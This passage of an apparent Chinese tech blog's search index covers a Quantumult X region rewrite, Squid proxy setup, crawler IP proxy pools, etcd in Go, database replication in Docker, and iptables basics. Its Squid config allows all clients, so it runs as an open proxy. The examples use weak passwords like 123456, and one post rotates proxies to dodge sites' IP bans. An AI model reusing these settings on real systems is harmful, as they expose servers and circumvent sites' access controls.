opt-parser=false, enabled=true\n\n```\n\nc. 换区\n\n换区：在[rewrite_local]中添加下句重写，并将`CN`改为想看的国家/地区的2位`大写`英文简写 JP（日本）｜KR（韩国）｜UK（英国）｜US（美国）｜TW（台湾）\n\n```ini\n(?<=_region=)CN(?=&) url 307 CN\n```\n\n\n\n# 3. 脚本\n\n\n\n\n# 4. 参考资料\n\n+ https://uzbox.com/tech/quanx.html\n+ https://www.notion.so/Quantumult-X-1d32ddc6e61c4892ad2ec5ea47f00917","tags":["iOS"],"categories":["软件"]},{"title":"squid代理介绍和使用","url":"%2Fp%2F94837db0.html","content":"\n爬虫玩得好，牢饭吃到饱。\n\n目前免费的代理池几乎不能用, 稳定的代理池收费又比较高。趁着双十一撸了几台便宜的云服务器, 直接拿来当代理服务器使用了。\n\nsquid服务程序是一款在Unix系统中最为流行的高性能代理服务软件，通常会被当作网站的前置缓存服务，用于替代用户向网站服务器请求页面数据并进行缓存，通俗来讲，squid服务程序会接收用户的请求，然后自动去下载制定数据(如网页)并存储在服务器内，当以后的用户再来请求相同数据时，则直接将刚刚存储在服务器本地的数据交给用户，较少用户的等待时间。\n\n<!-- more -->\n\n# 1. squid代理分类\n\n### 1.1 正向代理\n\n正向代理让用户可以通过Squid服务程序获取网站页面的数据，具体工作形式分为标准代理模式与透明代理模式。\n\n+ 标准正向代理模式：\n\n  用户访问网站，先到squid代理服务器，如果squid代理服务器有数据，那么squid就直接从缓存中放回给用户，如果squid缓存中没有，那么squid就代替用户去访问网站，把数据返回的给用户的同时留一份到缓存中，一遍下次用户（或者其他用户）访问的时候，直接从缓存中返回给用户\n\n  \n\n+ 透明正向代理模式：\n\n  透明代理缓冲服务器和标准代理服务器的功能完全相同。相对于普通代理服务而言，客户端不需要做任何和代理服务器相关的设置，对用户而言，感觉不到代理服务器的存在，所以称之为透明代理。\n\n  即把代理服务器部署在核心的上网出口，当用户上网浏览页面时，会交给代理服务器向外请求，如果结合iptables可以实现代理+网关+内容过滤+流量安全控制等完整的上网解决方案。\n\n  \n\n### 1.2 反向代理\n\n反向代理是指以代理服务器来接受internet上的连接请求，然后将请求转发给内部网络上的服务器，并将从内部服务器上得到的结果返回给internet上请求连接的客户端，此时代理服务器对外表现为一个服务器。\n\nsquid做反向代理服务器，通常工作在一个服务器集群的前端，在用户看来，squid服务器就是他所要访问的服务器，而实际意义上，squid只是接受用户的请求，同时将用户请求转发给内部真正的WEB服务器，如果squid本身有用户要访问的内容，则squid直接将数据返回给用户，起到了缓存数据的作用，减少了后端服务器的压力。\n\n\n\n### 1.3 区别\n\n+ 概念\n\n  正向代理：对于原始服务器而言，就是客户端的代言人\n\n  反向代理：对于客户端而言，就像是原始服务器\n\n+ 用途\n\n  正向代理的典型用途是为在防火墙内的局域网客户端提供访问Internet的途径。正向代理还可以使用缓冲特性减少网络使用率。\n\n  反向代理还可以为后端的多台服务器提供负载平衡，或为后端较慢的服务器提供缓冲服务。另外，反向代理还可以启用高级URL策略和管理技术，从而使处于不同web服务器系统的web页面同时存在于同一个URL空间下。\n\n+ 安全性\n\n  正向代理允许客户端通过它访问任意网站并且隐藏客户端自身，因此你必须采取安全措施以确保仅为经过授权的客户端提供服务。\n\n  反向代理对外都是透明的，访问者并不知道自己访问的是一个代理。\n\n  \n\n# 2. 安装使用\n\n```bash\napt update\napt install -y squid\n```\n\n\n\n### 2.1 修改配置\n\n```bash\nvi /etc/squid/squid.conf\n\n# 代理服务器端口\nhttp_port 3128\n\n\n# 修改默认允许策略, 把 deny 换成 allow\nhttp_access deny all\nhttp_access allow all\n```\n\n修改完配置以后重启: `systemctl restart squid`\n\n\n\n### 2.2 log 配置\n\nsquid的日志位于/var/log/squid/目录下。\n\n```bash\ntail -f /var/log/squid/access.log\n```\n\n如果想在log上加上日期: \n\n```ini\nlogformat combined %>a %ui %un [%tl] \"%rm %ru HTTP/%rv\" %Hs %<st \"%{Referer}>h\" \"%{User-Agent}>h\" %Ss:%Sh %{host}>h\naccess_log daemon:/var/log/squid/access.log combined\n```\n\n\n\n### 2.3 允许特定 ip\n\n先增加一个规则, 然后允许\n\n```ini\nacl specialIP src x.x.x.x\nhttp_access allow specialIP\n\n# 例子\nacl papa src 1.1.1.1\nhttp_access allow papa\n```\n\n\n\n# 3. 注意事项\n\n### 3.1 浏览器设置代理访问\n\nTODO:\n\n### 3.2 测试demo\n\n如果无法访问, 请检查是否开启防火墙端口\n\n```go\npackage main\n\nimport (\n   \"fmt\"\n   \"io/ioutil\"\n   \"log\"\n   \"net/http\"\n   \"net/url\"\n   \"time\"\n)\n\nfunc main() {\n  proxy, err := url.Parse(\"http://代理ip:代理端口\")\n   if err != nil {\n      log.Fatal(err)\n   }\n\n   httpClient := &http.Client{\n      Timeout: time.Second * 10,\n      Transport: &http.Transport{\n         Proxy: http.ProxyURL(proxy),\n      },\n   }\n\n   res, err := httpClient.Get(\"https://www.baidu.com\")\n   if err != nil {\n      log.Println(err)\n      return\n   }\n   defer res.Body.Close()\n   if res.StatusCode != http.StatusOK {\n      log.Println(err)\n      return\n   }\n   c, _ := ioutil.ReadAll(res.Body)\n   fmt.Println(string(c))\n}\n```\n\n\n\n# 4. 参考资料\n\n+ http://blog.haoji.me/linux-squid-proxy.html\n+ https://www.cnblogs.com/bluestorm/p/9032086.html","tags":["squid"],"categories":["爬虫"]},{"title":"爬虫IP代理池","url":"%2Fp%2F3020e4ad.html","content":"\n\n\n对于爬虫来说，由于爬虫爬取速度过快，在爬取过程中可能遇到同一个IP访问过于频繁的问题，此时网站就会让我们输入验证码登录或者直接封锁IP，这样会给爬取带来极大的不便。\n\n使用代理隐藏真实的IP，让服务器误以为是代理服务器在请求自己。这样在爬取过程中通过不断更换代理，就不会被封锁，可以达到很好的爬取效果。\n\n<!-- more -->\n\n\n\n# 1. 免费代理\n\n免费代理大多数情况下都是不好用的，所以比较靠谱的方法是购买付费代理。\n\n### 1.1 开源项目 proxy_pool\n\n##### 1.1.1 安装和启动\n\n``` bash\ndocker pull jhao104/proxy_pool\n\n#依赖redis, 所以要先安装 redis\ndocker run -d --name redis -p 6379:6379 redis:latest  --requirepass \"123456\"\ndocker run --env DB_CONN=redis://:123456@172.17.0.1:6379/1 -p 5010:5010 --name proxy_pool jhao104/proxy_pool:latest\n```\n\n\n\n#### 1.1.2 使用\n\ndocker 启动后, 通过访问本地的接口, 就可以得到 ip\n\n```\nhttp://127.0.0.1:5010/get/\n```\n\n或者用作者给出的测试地址: http://118.24.52.95/get/\n\n\n\n\n# 2. 付费代理\n\n### 2.1 芝麻代理\n\n+ http://h.zhimaruanjian.com/getapi/\n\n+ 生成 API 链接\n\n+ 调用 API 获取 IP 和端口(如果提示加入白名单, 用文档里的接口即可)\n\n  \n\n# 3. 代码\n\n### 3.1 golang \n\n```go\npackage main\n\nimport (\n   \"fmt\"\n   \"io/ioutil\"\n   \"log\"\n   \"net/http\"\n   \"net/url\"\n   \"time\"\n)\n\nfunc main() {\n\n  proxy, err := url.Parse(\"http://代理ip:代理端口\")\n   if err != nil {\n      log.Fatal(err)\n   }\n\n   httpClient := &http.Client{\n      Timeout: time.Second * 10,\n      Transport: &http.Transport{\n         Proxy: http.ProxyURL(proxy),\n      },\n   }\n\n   res, err := httpClient.Get(\"https://www.baidu.com\")\n   if err != nil {\n      log.Println(err)\n      return\n   }\n   defer res.Body.Close()\n   if res.StatusCode != http.StatusOK {\n      log.Println(err)\n      return\n   }\n   c, _ := ioutil.ReadAll(res.Body)\n   fmt.Println(string(c))\n}\n```\n\n\n\n# 4. 参考资料\n\n+ https://cuiqingcai.com/5491.html\n+ https://github.com/jhao104/proxy_pool\n+ http://www.zhimaruanjian.com/","tags":["爬虫"],"categories":["爬虫"]},{"title":"etcd的原理与golang实战","url":"%2Fp%2Fc0b47ece.html","content":"\n\n\n# 1. etcd 介绍\n\n[etcd](https://etcd.io/)是使用Go语言开发的一个开源的、高可用的分布式key-value存储系统，可以用于配置共享和服务的注册和发现。类似项目有zookeeper和consul。\n\netcd具有以下特点：\n\n- 完全复制：集群中的每个节点都可以使用完整的存档\n- 高可用性：Etcd可用于避免硬件的单点故障或网络问题\n- 一致性：每次读取都会返回跨多主机的最新写入\n- 简单：包括一个定义良好、面向用户的API（gRPC）\n- 安全：实现了带有可选的客户端证书身份验证的自动化TLS\n- 快速：每秒10000次写入的基准速度\n- 可靠：使用Raft算法实现了强一致、高可用的服务存储目录\n\n<!-- more -->\n\n# 2. etcd 安装和使用\n\n### 2.1 下载安装\n\nhttps://github.com/etcd-io/etcd/releases\n\n```bash\nETCD_VER=v3.4.13\n\n# choose either URL\nGOOGLE_URL=https://storage.googleapis.com/etcd\nGITHUB_URL=https://github.com/etcd-io/etcd/releases/download\nDOWNLOAD_URL=${GOOGLE_URL}\n\nrm -f /tmp/etcd-${ETCD_VER}-linux-amd64.tar.gz\nrm -rf /tmp/etcd-download-test && mkdir -p /tmp/etcd-download-test\n\ncurl -L ${DOWNLOAD_URL}/${ETCD_VER}/etcd-${ETCD_VER}-linux-amd64.tar.gz -o /tmp/etcd-${ETCD_VER}-linux-amd64.tar.gz\ntar xzvf /tmp/etcd-${ETCD_VER}-linux-amd64.tar.gz -C /tmp/etcd-download-test --strip-components=1\nrm -f /tmp/etcd-${ETCD_VER}-linux-amd64.tar.gz\n\n/tmp/etcd-download-test/etcd --version\n/tmp/etcd-download-test/etcdctl version\n```\n\n\n\n### 2.2 启动\n\n为了方便, 移动到环境变量下\n\n```bash\nmv /tmp/etcd-download-test/etcd /usr/local/bin/\nmv /tmp/etcd-download-test/etcdctl /usr/local/bin/\n```\n\n+ 启动\n\n```bash\netcd\n\nnohup etcd --listen-client-urls http://0.0.0.0:2379 --advertise-client-urls http://0.0.0.0:2379 &\n```\n\n+ etcd TCP ports\n\nThe [official etcd ports](http://www.iana.org/assignments/service-names-port-numbers/service-names-port-numbers.txt) 对于客户端请求是2379，即curl set get 时用的端口。节点间通信端口是2380。\n\n\n\n### 2.3 操作\n\n```bash\netcdctl put mykey \"this is awesome\"\n#OK\n\netcdctl get mykey\n#mykey\n#this is awesome\n\netcdctl del mykey\n#1\n\netcdctl get mykey\n#\n\n\n# 获取所有的键值\netcdctl get / --prefix --keys-only\netcdctl get \"\" --prefix --keys-only | sed '/^\\s*$/d'\n```\n\n\n\n### 2.4 集群\n\n```\netcd --config-file etcd.conf\n```\n\netcd1.conf\n\n```bash\nname: etcd-1\ndata-dir: /data/server/etcd/data\nlisten-client-urls: http://172.21.0.17:2379,http://127.0.0.1:2379\nadvertise-client-urls: http://172.21.0.17:2379,http://127.0.0.1:2379\nlisten-peer-urls: http://172.21.0.17:2380 # 监听的\ninitial-advertise-peer-urls: http://172.21.0.17:2380\ninitial-cluster: etcd-1=http://172.21.0.17:2380,etcd-2=http://172.21.0.17:2390,etcd-3=http://172.21.0.15:2380\ninitial-cluster-token: etcd-cluster-token\ninitial-cluster-state: new\n```\n\netcd2.conf\n\n```bash\nname: etcd-2\ndata-dir: /data/server/etcd2/data\nlisten-client-urls: http://172.21.0.17:2389,http://127.0.0.1:2389\nadvertise-client-urls: http://172.21.0.17:2389,http://127.0.0.1:2389\nlisten-peer-urls: http://172.21.0.17:2390 # 监听的\ninitial-advertise-peer-urls: http://172.21.0.17:2390\ninitial-cluster: etcd-1=http://172.21.0.17:2380,etcd-2=http://172.21.0.17:2390,etcd-3=http://172.21.0.15:2380\ninitial-cluster-token: etcd-cluster-token\ninitial-cluster-state: existing\n```\n\netcd3.conf\n\n```bash\n# 节点名称\nname: etcd-3 \n\n# 数据存储目录\ndata-dir: /data/server/etcd/data \n\n# 监听在客户端流量上的URL列表，该参数告诉etcd在指定的协议://IP:port组合上接受来自客户端的传入请求。\nlisten-client-urls: http://172.21.0.15:2379,http://127.0.0.1:2379 \n\n# 此成员的客户端URL的列表，这些URL广播给集群的其余部分。 这些URL可以包含域名。\nadvertise-client-urls: http://172.21.0.15:2379,http://127.0.0.1:2379\n\n# 监听在对等节点流量上的URL列表，该参数告诉etcd在指定的协议://IP:port组合上接受来自其对等方的传入请求。\nlisten-peer-urls: http://172.21.0.15:2380\n\n# 此成员的对等URL的列表，以通告到集群的其余部分。 这些地址用于在集群周围传送etcd数据。 所有集群成员必须至少有一个路由。 这些URL可以包含域名。\ninitial-advertise-peer-urls: http://172.21.0.15:2380\n\n# 启动集群的初始化配置\ninitial-cluster: etcd-1=http://172.21.0.17:2380,etcd-2=http://172.21.0.17:2390,etcd-3=http://172.21.0.15:2380\n\n# 引导期间etcd群集的初始集群令牌。\ninitial-cluster-token: etcd-cluster-token\n\n# 初始群集状态（“新”或“现有”）。 对于在初始静态或DNS引导过程中存在的所有成员，将其设置为new。 如果此选项设置为existing，则etcd将尝试加入现存集群。 如果设置了错误的值，etcd将尝试启动，但会安全地失败。\ninitial-cluster-state: new\n```\n\n\n\n`etcdctl member list`\n\n```\nhash1: name=etcd-1 peerURLs=http://172.21.0.17:2380 clientURLs=http://127.0.0.1:2379,http://172.21.0.17:2379 isLeader=false\n\nhash2: name=etcd-2 peerURLs=http://172.21.0.17:2390 clientURLs=http://127.0.0.1:2389,http://172.21.0.17:2389 isLeader=false\n\nhash3: name=etcd-3 peerURLs=http://172.21.0.15:2380 clientURLs=http://127.0.0.1:2379,http://172.21.0.15:2379 isLeader=true\n```\n\n\n\n# 3. golang 使用 etcd\n\nhttps://github.com/etcd-io/etcd/tree/master/client\n\n```bash\ngo get go.etcd.io/etcd/v3/client\n```\n\n代码:\n\n```go\npackage main\n\nimport (\n\t\"log\"\n\t\"time\"\n\t\"context\"\n\n\t\"go.etcd.io/etcd/v3/client\"\n)\n\nfunc main() {\n\tcfg := client.Config{\n\t\tEndpoints:               []string{\"http://127.0.0.1:2379\"},\n\t\tTransport:               client.DefaultTransport,\n\t\t// set timeout per request to fail fast when the target endpoint is unavailable\n\t\tHeaderTimeoutPerRequest: time.Second,\n\t}\n\tc, err := client.New(cfg)\n\tif err != nil {\n\t\tlog.Fatal(err)\n\t}\n\tkapi := client.NewKeysAPI(c)\n\t// set \"/foo\" key with \"bar\" value\n\tlog.Print(\"Setting '/foo' key with 'bar' value\")\n\tresp, err := kapi.Set(context.Background(), \"/foo\", \"bar\", nil)\n\tif err != nil {\n\t\tlog.Fatal(err)\n\t} else {\n\t\t// print common key info\n\t\tlog.Printf(\"Set is done. Metadata is %q\\n\", resp)\n\t}\n\t// get \"/foo\" key's value\n\tlog.Print(\"Getting '/foo' key value\")\n\tresp, err = kapi.Get(context.Background(), \"/foo\", nil)\n\tif err != nil {\n\t\tlog.Fatal(err)\n\t} else {\n\t\t// print common key info\n\t\tlog.Printf(\"Get is done. Metadata is %q\\n\", resp)\n\t\t// print value\n\t\tlog.Printf(\"%q key has %q value\\n\", resp.Node.Key, resp.Node.Value)\n\t}\n}\n```\n\n\n\n### 3.1 报错 undefined: balancer.PickOptions\n\n具体操作方法是在go.mod里加上：\n\n```go\nreplace google.golang.org/grpc => google.golang.org/grpc v1.26.0\n```\n\n\n\n# 4. 参考资料\n\n+ https://github.com/etcd-io/etcd\n+ https://blog.pytool.com/devops/etcd/etcdctl/\n+ https://www.liwenzhou.com/posts/Go/go_etcd/\n+ https://www.cnblogs.com/cbkj-xd/p/11934599.html","tags":["etcd"],"categories":["分布式"]},{"title":"不同数据库的主从复制流程","url":"%2Fp%2F2aa5fdb4.html","content":"\n# 1. MySQL 主从复制\n\nMySQL主从复制涉及到三个线程\n\n+ 一个运行在主节点（log dump thread）\n\n+ 其余两个(I/O thread, SQL thread)运行在从节点\n\n![1](不同数据库的主从复制流程/1.jpg)\n\n<!-- more -->\n\n### 1.1 MySQL 复制过程\n\n要实施复制，首先必须打开Master 端的binary log（bin-log）功能，否则无法实现。\n\n+ **主节点 binary log dump 线程**\n\n  当从节点连接主节点时，主节点会创建一个log dump 线程，用于发送bin-log的内容。在读取bin-log中的操作时，此线程会对主节点上的bin-log加锁，当读取完成，甚至在发动给从节点之前，锁会被释放。\n\n+ **从节点I/O线程**\n\n  当从节点上执行`start slave`命令之后，从节点会创建一个I/O线程用来连接主节点，请求主库中更新的bin-log。I/O线程接收到主节点binlog dump 进程发来的更新之后，保存在本地relay-log中。\n\n+ **从节点SQL线程**\n\n  SQL线程负责读取relay log中的内容，解析成具体的操作并执行，最终保证主从数据的一致性。\n\n\n\n### 1.2 MySQL 主从复制模式\n\nMySQL 主从复制默认是异步的模式。\n\nMySQL增删改操作会全部记录在binary log中，当slave节点连接master时，会主动从master处获取最新的bin log文件。并把bin log中的sql relay。\n\n+ **异步模式**\n\n  主节点不会主动push bin log到从节点，这样有可能导致failover的情况下，也许从节点没有即时地将最新的bin log同步到本地。\n\n+ **半同步模式(mysql semi-sync)**\n\n  主节点只需要接收到其中一台从节点的返回信息，就会commit；否则需要等待直到超时时间然后切换成异步模式再提交。\n\n  binlog至少传输到了一个从节点上，不能保证从节点将此事务更新到db中。性能上会有一定的降低，响应时间会变长。\n\n+ **全同步模式**\n\n  全同步模式是指主节点和从节点全部执行了commit并确认才会向客户端返回成功。\n\n\n\n### 1.3 MySQL 复制方式\n\n+ 基于SQL语句的复制（statement-based replication，SBR）\n\n  就是记录sql语句在bin log中，Mysql 5.1.4 及之前的版本都是使用的这种复制格式。\n\n  优点是只需要记录会修改数据的sql语句到binlog中，减少了binlog日志量，节约I/O，提高性能。\n\n  缺点是在某些情况下，会导致主从节点中数据不一致（比如now()函数等）。\n\n  \n\n+ 基于行的复制（row-based replication，RBR)\n\n  mysql master将SQL语句分解为基于Row更改的语句并记录在bin log中，也就是只记录哪条数据被修改了，修改成什么样。\n\n  优点是不会出现某些特定情况下的存储过程、或者函数、或者trigger的调用或者触发无法被正确复制的问题。\n\n  缺点是会产生大量的日志，尤其是修改table的时候会让日志暴增,同时增加bin log同步时间。也不能通过bin log解析获取执行过的sql语句，只能看到发生的data变更。\n\n  \n\n+ 混合模式复制（mixed-based replication,MBR)\n\n  MySQL NDB cluster 7.3 和7.4 使用的MBR。是以上两种模式的混合，对于一般的复制使用STATEMENT模式保存到binlog，对于STATEMENT模式无法复制的操作则使用ROW模式来保存，MySQL会根据执行的SQL语句选择日志保存方式。\n\n\n\n### 1.4 操作\n\n+ docker 运行 mysql\n\n  ```bash\n  docker pull mysql:5.7 # 拉取镜像\n  \n  docker run --name mysql1 -p 33061:3306 -e MYSQL_ROOT_PASSWORD=123456 -d mysql:5.7 # 运行第一个 mysql\n  docker run --name mysql2 -p 33062:3306 -e MYSQL_ROOT_PASSWORD=123456 -d mysql:5.7 # 运行第二个 mysql\n  ```\n\n​\t第一个当做主服务器, 第二个当做从服务器\n\n+ 主服务器配置\n\n  ```bash\n  # 1. 进入容器修改配置文件\n  docker exec -it mysql1 /bin/bash\n  \n  vi /etc/mysql/mysql.conf.d/mysqld.cnf\n  [mysqld]\n  server-id=1\n  log-bin=mysql-bin\n  \n  docker restart mysql1\n  \n  # 2. 配置权限, 可以被连接\n  mysql -u root -p\n  grant replication slave on *.* to 'root'@'172.17.0.1' identified by '123456';\n  flush privileges;\n  show master status\\G\n  *************************** 1. row ***************************\n             File: mysql-bin.000003\n           Position: 319\n       Binlog_Do_DB:\n   Binlog_Ignore_DB:\n  Executed_Gtid_Set:\n  ```\n  \n+ 从服务器配置\n\n  ```bash\n  # 1. 进入容器修改配置文件\n  docker exec -it mysql2 /bin/bash\n  \n  vi /etc/mysql/mysql.conf.d/mysqld.cnf\n  [mysqld]\n  server-id=2\n  log-bin=mysql-bin\n  \n  docker restart mysql2\n  \n  \n  # 2.开启slave, 可以被访问\n  mysql -u root -p\n  \n  # 172.17.0.1 是docker mac 本机 ip, 33061是 主的端口\n  change master to master_host='172.17.0.1',\n  master_port=33061,\n  master_user='root',\n  master_password='123456',\n  master_log_file='mysql-bin.000003',\n  master_log_pos=319; \n  \n  \n  start slave;\n  show slave status\\G\n  *************************** 1. row ***************************\n                 Slave_IO_State: Waiting for master to send event\n                    Master_Host: 172.17.0.1\n                    Master_User: root\n                    Master_Port: 33061\n                  Connect_Retry: 60\n                Master_Log_File: mysql-bin.000003\n            Read_Master_Log_Pos: 649\n                 Relay_Log_File: 9339fdceb667-relay-bin.000002\n                  Relay_Log_Pos: 650\n          Relay_Master_Log_File: mysql-bin.000003\n               Slave_IO_Running: Yes\n              Slave_SQL_Running: Yes\n  ```\n  \n+ 测试\n\n  ```bash\n  # 主数据库创建\n  create database test_1;\n  # 从数据查看, 即可以看到\n  show databases;\n  ```\n\n  \n\n# 2. redis 主从复制\n\n主服务器负责接收写请求, 从服务器负责接收读请求(从服务器无法进行写操作)\n\n### 2.1 同步模式\n\n+ 完整重同步(redis 2.8以前)\n  + 从服务器向主服务器发送PSYNC命令\n  \n  + 收到PSYNC命令的主服务器执行BGSAVE命令，在后台**生成一个RDB文件**。并用一个**缓冲区**来记录从现在开始执行的所有**写命令**。\n  \n  + 当主服务器的BGSAVE命令执行完后，将生成的RDB文件发送给从服务器，**从服务器接收和载入RDB文件**。将自己的数据库状态更新至与主服务器执行BGSAVE命令时的状态。\n  \n  + 主服务器将所有缓冲区的**写命令发送给从服务器**，从服务器执行这些写命令，达到数据最终一致性。\n  \n    \n  \n+ 部分重同步\n\n  + 主从服务器的复制偏移量\n\n    - 主服务器每次传播N个字节，就将自己的复制偏移量加上N\n\n    - 从服务器每次收到主服务器的N个字节，就将自己的复制偏移量加上N\n\n      \n\n  + 主服务器的复制积压缓冲区\n\n    主服务器进行命令传播时，不仅仅会将写命令发送给所有的从服务器，还会将写命令**入队到复制积压缓冲区**里面(这个大小可以调的)。如果复制积压缓冲区**存在**丢失的偏移量的数据，那就执行部分重同步，否则执行完整重同步。\n\n    \n\n  + 服务器运行的ID(**run ID**)\n\n    服务器运行的ID(**run ID**)实际上就是用来比对ID是否相同。如果不相同，则说明从服务器断线之前复制的主服务器和当前连接的主服务器是两台服务器，这就会进行完整重同步。\n\n    \n\n+ 命令传播\n\n  当完成了同步之后，主从服务器就会进入命令传播阶段。这时主服务器只要将自己的写命令发送给从服务器，而从服务器接收并执行主服务器发送过来的写命令，就可以保证主从服务器一直保持数据一致了！\n\n  在命令传播阶段，从服务器默认会以每秒一次的频率，向服务器发送命令`REPLCONF ACK <replication_offset>` 其中replication_offset是从服务器当前的复制偏移量\n\n\n\n### 2.2 操作\n\n+ 下载\n\n  ```bash\n  # 下载\n  docker pull redis:latest\n\n  # 下载配置文件 \n  http://download.redis.io/redis-stable/redis.conf\n\n  # 主redis配置, 无需特殊配置, 因为在 docker 内, 需要修改一下bind\n  vi $PWD/redis1/redis.conf\n  bind 127.0.0.1 改为 bind 0.0.0.0\n\n  # 修改从redis配置, 修改 redis.conf 文件\n  vi $PWD/redis2/redis.conf\n  slaveof 172.17.0.1 63791\n  ```\n\n+ 启动\n\n  ```bash\n  # 主服务器\n  docker run \\\n  -p 63791:6379 \\\n  -v $PWD/redis1/redis.conf:/etc/redis/redis.conf \\\n  --privileged=true \\\n  --name redis1 \\\n  -d redis redis-server /etc/redis/redis.conf\n\n  # 从服务器\n  docker run \\\n  -p 63792:6379 \\\n  -v $PWD/redis2/redis.conf:/etc/redis/redis.conf \\\n  --privileged=true \\\n  --name redis2 \\\n  -d redis redis-server /etc/redis/redis.conf\n  ```\n\n+ 测试\n\n  ```bash\n  # 查看配置文件\n  redis-cli info | grep config_file\n  \n  # 查看从的状态, 看到master_link_status:up就是成功\n  redis-cli info | grep master\n  master_host:172.17.0.1\n  master_port:63791\n  master_link_status:up\n  \n\t# 然后在主服务器 set key, 在从服务器 get 即可\n  ```\n  \n  \n\n# 3. mongodb 主从复制\n\nMongoDB 有三种集群部署模式，分别为主从复制（Master-Slaver）、副本集（Replica Set）和分片（Sharding）模式。\n\n- Master-Slaver 是一种主从副本的模式，目前已经不推荐使用。\n- Replica Set 模式取代了 Master-Slaver 模式，是一种互为主从的关系。Replica Set 将数据复制多份保存，不同服务器保存同一份数据，在出现故障时自动切换，实现故障转移，在实际生产中非常实用。\n- Sharding 模式适合处理大量数据，它将数据分开存储，不同服务器保存不同的数据，所有服务器数据的总和即为整个数据集。\n\n### 3.1 主从复制(不推荐)\n\n+ --master用来确定主服务器\n\n+ --slave 和 --source 来控制从服务器\n+ 可以在mongodb.conf配置文件里指明主从关系，这样启动mongodb的时候只要跟上配置文件就行，就不需要通过--master和--slave来指明主从了。\n\n### 3.2 副本集\n\n只能 master 写, 从不能写。\n\n+ 下载\n\n  ```bash\n  docker pull mongo:latest\n  \n  # 主服务器\n  docker run \\\n  -d \\\n  -p 27018:27017 \\\n  --name mongo1 \\\n  mongo mongod --replSet my-mongo-set\n  \n  # 从服务器\n  docker run \\\n  -d \\\n  -p 27019:27017 \\\n  --name mongo2 \\\n  mongo mongod --replSet my-mongo-set\n  ```\n  \n+ 配置\n\n  ```bash\n  docker exec -it mongo1 mongo\n  \n  config = {\n       \"_id\" : \"my-mongo-set\",\n       \"members\" : [\n           {\n               \"_id\" : 0,\n               \"host\" : \"172.17.0.1:27018\"\n           },\n           {\n               \"_id\" : 1,\n               \"host\" : \"172.17.0.1:27019\"\n           }\n       ]\n    }\n  rs.initiate(config)\n  # 下面是输出\n  {\n          \"ok\" : 1,\n          \"$clusterTime\" : {\n                  \"clusterTime\" : Timestamp(1595349445, 1),\n                  \"signature\" : {\n                          \"hash\" : BinData(0,\"AAAAAAAAAAAAAAAAAAAAAAAAAAA=\"),\n                          \"keyId\" : NumberLong(0)\n                  }\n          },\n          \"operationTime\" : Timestamp(1595349445, 1)\n  }\n  \n  # 如果一切顺利，提示符将变成这样：(需手动随便敲命令触发下)\n  my-mongo-set:PRIMARY>\n  ```\n\n\n+ 测试\n\n  ```bash\n  # 启动从服务器\n  docker exec -it mongo2 mongo\n  my-mongo-set:PRIMARY>\n  \n  \n  # 主服务器\n  my-mongo-set:PRIMARY> db.mycollection.insert({name : 'sample'})\n  WriteResult({ \"nInserted\" : 1 })\n  my-mongo-set:PRIMARY> db.mycollection.find()\n  { \"_id\" : ObjectId(\"5f171a9bfb41dd82f33d6b2d\"), \"name\" : \"sample\" }\n  \n  # 从服务器\n  my-mongo-set:SECONDARY> db.setSlaveOk() # 设置同步\n  my-mongo-set:SECONDARY> db.mycollection.find()\n  { \"_id\" : ObjectId(\"5f171a9bfb41dd82f33d6b2d\"), \"name\" : \"sample\" }\n  \n  \n  # 查询状态\n  1. 判断是不是master: db.isMaster()\n  2. 复制集状态查询：rs.status()\n  3. 查看oplog状态： rs.printReplicationInfo()\n  4. 查看复制延迟：  rs.printSlaveReplicationInfo()\n  5. 查看服务状态详情:   db.serverStatus()\n  ```\n  \n  \n\n\n# 4. 问题总结\n\n+ docker 内没有命令\n\n  ```bash\n  apt update\n  apt install vim #vim\n  apt install procps # ps\n  apt install iputils-ping #ping\n  ```\n\n  \n\n# 5. 参考资料\n\n+ https://zhuanlan.zhihu.com/p/50597960\n+ https://outmanzzq.github.io/2019/01/30/docker-mongo-replica/","tags":["sql"],"categories":["数据库"]},{"title":"iptables使用教程03","url":"%2Fp%2F354a6a3b.html","content":"\n\n\n# 10. 防火墙关系\n\n### 10.1 firewalld 和 iptables 关系(Centos)\n\nConterOS7.0以上使用的是firewall，ConterOS7.0以下使用的是iptables\n\n<!-- more -->\n\n在RHEL7里有几种防火墙共存：firewalld、iptables、ebtables，默认是使用firewalld来管理netfilter子系统，不过底层调用的命令仍然是iptables等。\n\nfirewalld跟iptables比起来至少有两大好处：\n\n1、firewalld可以动态修改单条规则，而不需要像iptables那样，在修改了规则后必须得全部刷新才可以生效；\n\n2、firewalld在使用上要比iptables人性化很多，即使不明白“五张表五条链”而且对TCP/IP协议也不理解也可以实现大部分功能。\n\nfirewalld跟iptables比起来，不好的地方是每个服务都需要去设置才能放行，因为默认是拒绝。而iptables里默认是每个服务是允许，需要拒绝的才去限制。\n\n\n\n### 10.2 ufw 和 iptables 关系(Ubuntu)\n\nUncomplicated Firewall，简称 UFW，是Ubuntu系统上默认的防火墙组件。UFW是为轻量化配置iptables而开发的一款工具。UFW 提供一个非常友好的界面用于创建基于IPV4，IPV6的防火墙规则。UFW 在 Ubuntu 8.04 LTS 后的所有发行版中默认可用。\n\n当使用了 ufw 这类前端时，就最好不要再碰 iptables 了，尤其要慎重使用 iptables – 来清空所有链的规则。在不了解 iptables 的表、链、规则之前，盲目的清空 iptables”规则” 就是耍流氓！\n\n试想，假如你在服务器上ufw enable，那么 INPUT 和 FORWARD 就是 DROP，那么当你iptables -F时，不仅仅是 SSH 的例外规则没了，所有出网的包也都出不去了！此时唯一能做的事情就是去 VNC、或者去机房插鼠标键盘显示器。\n\n\n\n### 10.3 虚拟防火墙和安全组有什么差异\n\n+ 云虚拟防火墙是互联网边界防火墙、VPC边界防火墙、主机边界防火墙的统称，为您提供互联网边界、VPC网络边界、ECS实例间的三重防护。\n\n+ 安全组是ECS提供的虚拟主机防火墙，对ECS实例间的流量进行访问控制。\n\n结论: \n\n1. 防火墙是在安全组之前生效的。\n\n2. 防火墙主要是做南北向的访问控制，作用范围是整个VPC，安全组主要是做东西向的访问控制，作用范围是虚拟机网卡，和防火墙形成互补的关系。\n\n![1](iptables使用教程03/99.png)\n\n\n\n\n\n# 11. 命令总结\n\n### 11.1 过滤查看\n\n```bash\n#查看对应表的所有规则，-t选项指定要操作的表，省略\"-t 表名\"时，默认表示操作filter表，-L表示列出规则，即查看规则\niptables -t 表名 -L\n\n\n#查看指定表的指定链中的规则\niptables -t 表名 -L 链名\n\n\n\n# 查看指定表的所有规则，并且显示更详细的信息（更多字段），-v表示verbose，表示详细的，冗长的，当使用-v选项时，会显示出\"计数器\"的信息，由于上例中使用的选项都是短选项，所以一般简写为iptables -t 表名 -vL\niptables -t 表名 -v 